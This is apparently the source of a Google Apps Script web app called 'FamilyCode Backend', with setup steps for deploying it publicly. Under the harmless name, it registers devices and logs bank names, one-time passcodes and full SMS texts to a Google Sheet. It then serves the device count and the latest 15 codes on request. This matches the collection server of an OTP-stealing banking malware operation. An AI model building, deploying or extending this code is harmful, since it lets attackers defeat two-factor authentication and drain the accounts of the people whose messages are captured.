/**
 * FamilyCode Backend - Google Apps Script
 * Handles device registration, OTP logging, and data retrieval.
 *
 * INSTRUCTIONS:
 * 1. Create a new Google Sheet.
 * 2. Go to Extensions > Apps Script.
 * 3. Paste this code into the editor.
 * 4. In Project Settings (gear icon) > Script Properties, add "API_KEY" with a secure value.
 * 5. Deploy as a Web App (Execute as: Me, Who has access: Anyone).
 */

var API_KEY = PropertiesService.getScriptProperties().getProperty('API_KEY');
var DEVICES_SHEET_NAME = "Devices";
var OTPS_SHEET_NAME = "OTPs";

/**
 * Validates the API key from the request parameters.
 */
function isAuthorized(e) {
  if (!API_KEY) {
    console.error("CRITICAL: API_KEY Script Property is not set.");
    return false;
  }
  return e.parameter.api_key === API_KEY;
}

/**
 * Returns a JSON error response for unauthorized requests.
 */
function unauthorizedResponse() {
  return ContentService.createTextOutput(JSON.stringify({
    "success": false,
    "error": "Unauthorized"
  })).setMimeType(ContentService.MimeType.JSON);
}

/**
 * GET Request Handler
 * action=fetch_data: Returns device count and last 15 OTPs.
 */
function doGet(e) {
  if (!isAuthorized(e)) return unauthorizedResponse();

  var action = e.parameter.action;
  var ss = SpreadsheetApp.getActiveSpreadsheet();

  if (action === 'fetch_data') {
    var devicesSheet = ss.getSheetByName(DEVICES_SHEET_NAME) || ss.insertSheet(DEVICES_SHEET_NAME);
    var otpsSheet = ss.getSheetByName(OTPS_SHEET_NAME) || ss.insertSheet(OTPS_SHEET_NAME);

    // Get Device Count (Unique device_id)
    var deviceData = devicesSheet.getDataRange().getValues();
    var uniqueDevices = [];
    if (deviceData.length > 1) {
      for (var i = 1; i < deviceData.length; i++) {
        var devId = deviceData[i][0];
        if (devId && uniqueDevices.indexOf(devId) === -1) {
          uniqueDevices.push(devId);
        }
      }
    }

    // Get Recent OTPs (Last 15)
    var otpData = otpsSheet.getDataRange().getValues();
    var recentOtps = [];
    if (otpData.length > 1) {
      // Data is in rows 1..N. Header is row 0.
      var totalRows = otpData.length;
      var count = 0;
      for (var j = totalRows - 1; j >= 1 && count < 15; j--) {
        recentOtps.push({
          "timestamp": otpData[j][0],
          "bank_name": otpData[j][1],
          "otp_code": otpData[j][2],
          "full_message": otpData[j][3]
        });
        count++;
      }
    }

    return ContentService.createTextOutput(JSON.stringify({
      "success": true,
      "device_count": uniqueDevices.length,
      "recent_otps": recentOtps
    })).setMimeType(ContentService.MimeType.JSON);
  }

  return ContentService.createTextOutput(JSON.stringify({
    "success": false,
    "error": "Invalid action"
  })).setMimeType(ContentService.MimeType.JSON);
}

/**
 * POST Request Handler
 * action=register: Appends device info.
 * action=save_otp: Appends OTP info.
 */
function doPost(e) {
  if (!isAuthorized(e)) return unauthorizedResponse();

  var action = e.parameter.action;
  var ss = SpreadsheetApp.getActiveSpreadsheet();

  if (action === 'register') {
    var devicesSheet = ss.getSheetByName(DEVICES_SHEET_NAME) || ss.insertSheet(DEVICES_SHEET_NAME);
    if (devicesSheet.getLastRow() === 0) {
      devicesSheet.appendRow(["device_id", "device_name", "timestamp"]);
    }
    devicesSheet.appendRow([
      e.parameter.device_id,
      e.parameter.device_name,
      new Date().toISOString()
    ]);
    return ContentService.createTextOutput(JSON.stringify({ "success": true })).setMimeType(ContentService.MimeType.JSON);
  }

  if (action === 'save_otp') {
    var otpsSheet = ss.getSheetByName(OTPS_SHEET_NAME) || ss.insertSheet(OTPS_SHEET_NAME);
    if (otpsSheet.getLastRow() === 0) {
      otpsSheet.appendRow(["timestamp", "bank_name", "otp_code", "full_message"]);
    }
    otpsSheet.appendRow([
      new Date().toISOString(),
      e.parameter.bank_name,
      e.parameter.otp_code,
      e.parameter.full_message
    ]);
    return ContentService.createTextOutput(JSON.stringify({ "success": true })).setMimeType(ContentService.MimeType.JSON);
  }

  return ContentService.createTextOutput(JSON.stringify({
    "success": false,
    "error": "Invalid action"
  })).setMimeType(ContentService.MimeType.JSON);
}
